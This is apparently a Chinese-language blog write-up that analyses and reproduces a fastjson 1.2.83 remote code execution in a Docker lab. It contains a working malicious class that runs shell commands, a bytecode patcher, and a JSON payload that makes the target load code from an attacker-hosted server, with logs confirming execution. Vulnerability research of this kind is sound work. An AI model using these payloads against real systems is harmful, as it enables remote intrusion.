---
title: fastjson 1.2.83 RCE
description: fastjson 1.2.83 RCE 漏洞分析与利用

date: 2026-08-23T10:12:52+08:00
lastmod: 2026-08-23T20:15:52+08:00
---
# fastjson 1.2.83 RCE!!!

https://fearsoff.org/cn/research/fastjson-1-2-83-rce

## 漏洞原理

```
Fastjson 1.2.83 still resolves the class resource named by an @type value
while AutoType is disabled. The parser replaces dots in the supplied type name
with slashes and asks the configured ClassLoader for the resulting .class file.

If an application provides a permissive ClassLoader that treats http:// or
jar: names as remote resources, this check becomes an SSRF and remote bytecode
loading primitive. A remotely served class carrying @JSONType passes the
jsonType check, after which TypeUtils.loadClass defines and instantiates it.
The static initializer of that class then gives code execution.
```

fastjson 的 AutoType 是根据 JSON 中的 `@type` 创建 Java 类实例的功能。正常情况下关闭 AutoType 后，普通的 `@type` 不应该被直接加载。

但是在 `ParserConfig` 中，即使 AutoType 关闭，解析器仍然会先读取传入类型对应的 class 文件，判断它有没有 `@JSONType`：

```java
String resource = typeName.replace('.', '/') + ".class";

if (defaultClassLoader != null) {
    is = defaultClassLoader.getResourceAsStream(resource);
}

if (is != null) {
    // 读取 class 文件，判断是否有 @JSONType
}

if (autoTypeSupport || jsonType || expectClassFlag) {
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
}
```

如果应用自己的 `ClassLoader` 对 HTTP 资源做了处理，就可以构造：

```text
http:..attacker:19090.Evil
```

因为点号会被替换成 `/`，最后得到：

```text
http://attacker:19090/Evil.class
```

本次 Docker 环境中 `attacker` 是攻击者容器的服务名。Windows 本地复现时，如果攻击者服务在本机，也可以把 `127.0.0.1` 转成整数 `2130706433`：

```json
{"@type":"http:..2130706433:19090.Evil"}
```

完整流程：

```text
@type
  ↓
ParserConfig 读取远程 Evil.class
  ↓
发现 @JSONType，绕过 AutoType 判断
  ↓
RemoteLoader 下载并 defineClass
  ↓
Evil 静态代码块执行
  ↓
RCE
```

这里的 `RemoteLoader` 是为了模拟 Spring Boot 等应用中比较宽松的类加载器环境。普通 JDK 8 的类加载器不会自动把 HTTP 地址当成 class 文件加载。

## 环境搭建

docker-compose.yml：

```yaml
name: fastjson

services:
  attacker:
    build:
      context: .
    image: fastjson-lab:1.2.83
    container_name: fastjson-attacker
    command: ["java", "-cp", "/opt/fastjson-lab/classes", "PayloadServer", "19090", "/opt/fastjson-lab/payload"]
    ports:
      - "19090:19090"

  vuln:
    image: fastjson-lab:1.2.83
    container_name: fastjson-vuln
    depends_on:
      - attacker
    command: ["java", "-cp", "/opt/fastjson-lab/classes:/opt/fastjson-lab/lib/fastjson-1.2.83.jar", "VulnServer"]
    ports:
      - "18080:8080"
```

Dockerfile：

```dockerfile
FROM eclipse-temurin:8-jdk

ARG FASTJSON_VERSION=1.2.83

RUN apt-get update \
    && apt-get install -y --no-install-recommends ca-certificates curl \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /opt/fastjson-lab/src /opt/fastjson-lab/lib \
       /opt/fastjson-lab/classes /opt/fastjson-lab/payload-raw \
       /opt/fastjson-lab/payload

RUN curl -fsSL \
    "https://repo.maven.apache.org/maven2/com/alibaba/fastjson/${FASTJSON_VERSION}/fastjson-${FASTJSON_VERSION}.jar" \
    -o "/opt/fastjson-lab/lib/fastjson-${FASTJSON_VERSION}.jar"

COPY src/ /opt/fastjson-lab/src/

RUN javac -encoding UTF-8 \
    -cp "/opt/fastjson-lab/lib/fastjson-${FASTJSON_VERSION}.jar" \
    -d /opt/fastjson-lab/classes \
    /opt/fastjson-lab/src/PayloadServer.java \
    /opt/fastjson-lab/src/PatchClass.java \
    /opt/fastjson-lab/src/RemoteLoader.java \
    /opt/fastjson-lab/src/VulnServer.java \
    /opt/fastjson-lab/src/Evil.java

RUN javac -encoding UTF-8 \
    -cp "/opt/fastjson-lab/lib/fastjson-${FASTJSON_VERSION}.jar" \
    -d /opt/fastjson-lab/payload-raw \
    /opt/fastjson-lab/src/Evil.java \
    && java -cp /opt/fastjson-lab/classes PatchClass \
       /opt/fastjson-lab/payload-raw/Evil.class \
       /opt/fastjson-lab/payload/Evil.class \
       http://attacker:19090/Evil

RUN useradd --system --uid 10001 --no-create-home fastjson \
    && chown -R fastjson:fastjson /opt/fastjson-lab

USER fastjson
WORKDIR /opt/fastjson-lab
```

进入目录启动：

```powershell
docker compose up -d
```

## 恶意类

`Evil.java`：

```java
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class Evil {
    static {
        System.out.println("[EVIL] static initializer executing");
        try {
            Process process = Runtime.getRuntime().exec(new String[]{
                "sh", "-c",
                "id > /tmp/fastjson-rce; echo '[EVIL] command executed' >> /tmp/fastjson-rce"
            });
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Evil() {
    }
}
```

因为 JVM 要求传入的类名和字节码内部名称一致，所以构建时还需要把 `Evil.class` 常量池里的类名改成：

```text
http://attacker:19090/Evil
```

`PatchClass.java` 就是做这个事情的。直接把普通的 `Evil.class` 当成 URL 类名加载，会报：

```text
NoClassDefFoundError: ... (wrong name: Evil)
```

## 漏洞POC复现

```powershell
docker compose ps
```

输出：

```text
NAME                IMAGE                 STATUS         PORTS
fastjson-attacker   fastjson-lab:1.2.83  Up             0.0.0.0:19090->19090/tcp
fastjson-vuln       fastjson-lab:1.2.83  Up             0.0.0.0:18080->8080/tcp
```

JDK 版本：

```powershell
docker exec fastjson-vuln java -version
```

```text
openjdk version "1.8.0_502"
OpenJDK Runtime Environment (Temurin)(build 1.8.0_502-b07)
OpenJDK 64-Bit Server VM (Temurin)(build 25.502-b07, mixed mode)
```

访问服务：

```powershell
curl.exe -i http://127.0.0.1:18080/
```

```text
HTTP/1.1 200 OK
Content-type: text/plain; charset=utf-8

fastjson 1.2.83 lab
POST /parse with JSON
```

发送 POC：

```powershell
$body = '{"@type":"http:..attacker:19090.Evil"}'

$client = New-Object System.Net.WebClient
$client.Headers['Content-Type'] = 'application/json'
$client.UploadString(
    'http://127.0.0.1:18080/parse',
    'POST',
    $body
)
```

返回：

```text
parsed=http:..attacker:19090.Evil@4454ed8d
```

查看日志：

```powershell
docker compose logs --no-color --tail=50 attacker vuln
```

可以看到目标访问了两次远程 class：

```text
fastjson-vuln      | [+] vulnerable fastjson service listening on 0.0.0.0:8080
fastjson-vuln      | [+] version: fastjson 1.2.83, AutoType: disabled
fastjson-vuln      | [*] JSON.parse: {"@type":"http:..attacker:19090.Evil"}
fastjson-attacker | [*] request: GET /Evil.class
fastjson-attacker | [*] request: GET /Evil.class
fastjson-vuln      | [EVIL] static initializer executing
```

第一次是 Fastjson 读取 class 判断 `@JSONType`，第二次是 `RemoteLoader` 下载 class 并执行 `defineClass`。

查看命令执行结果：

```powershell
docker exec fastjson-vuln sh -c 'cat /tmp/fastjson-rce'
```

输出：

```text
uid=10001(fastjson) gid=999(fastjson) groups=999(fastjson)
[EVIL] command executed
```

复现成功。

---

ps:这个漏洞有意思的地方是 AutoType 已经关闭了，但是 Fastjson 为了判断 `@JSONType` 还是会先去读取传入类型对应的 class。只要应用自己的 ClassLoader 把这个读取动作扩展成 HTTP，类型判断就变成了 SSRF、远程字节码加载，最后在静态代码块里完成 RCE。
